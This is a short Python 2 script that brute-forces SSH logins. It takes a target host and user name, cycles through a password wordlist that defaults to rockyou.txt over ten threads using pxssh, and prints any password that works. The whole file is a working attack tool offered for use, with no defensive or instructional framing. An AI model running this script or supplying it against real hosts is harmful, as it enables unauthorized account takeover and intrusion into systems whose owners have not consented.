#!/usr/bin/python

import pxssh
import sys
import time
import optparse
from threading import *

maxConnections = 10
Found = False
Fails = 0
connection_lock = BoundedSemaphore(value = maxConnections)
'''
def send_command(child, command):
  child.sendline(command)
  child.expect(PROMPT)
  print child.before
'''
def connect(host, user, password, release):
  global Found
  global Fails 
  try:
    s = pxssh.pxssh()
    s.login(host,user,password)
    Found = True
    print "[+]=====>Password Found: " + password + "<====="
  except Exception, e:
    if 'read_nonblocking' in str(e):
      Fails += 1
      time.sleep(5)
      connect(host, user, password, False)
    elif 'synchronize with original prompt' in str(e):
      time.sleep(1)
      connect(host, user, password, False)
  finally:
    if release:
      connection_lock.release()    

def main():
  parser = optparse.OptionParser('Usage: ' + sys.argv[0] + '-H <host> -U <user> -P <passwordfile>')
  parser.add_option('-H', dest='tgt_host', type='string', help='target host')
  parser.add_option('-U', dest='tgt_user', type='string', help='target user')
  parser.add_option('-P', dest='pass_file', type='string', help='password dictionary file. the default one is /usr/share/wordlists/rockyou.txt')
  options, args = parser.parse_args()

  host = options.tgt_host
  user = options.tgt_user
  filename = options.pass_file
  
  if (host is None) | (user is None):
    print parser.usage
    exit(0)

  if filename is None:
    filename = '/usr/share/wordlists/rockyou.txt'

  try:
    f = open(filename, 'r')
    for line in f.readlines():
      if Found:
        f.close()
        exit(0)
      if Fails >= 5:
        print '[-]Too many timeouts! Exiting!'
        f.close()
        exit(0)
      line = line.strip('\n')
      connection_lock.acquire()
      print '[*]Testing: ' + str(line)
      t = Thread(target = connect, args = (host, user, line, True))
      t.start() 
  except Exception, e:
    print e
    exit(0)

main()
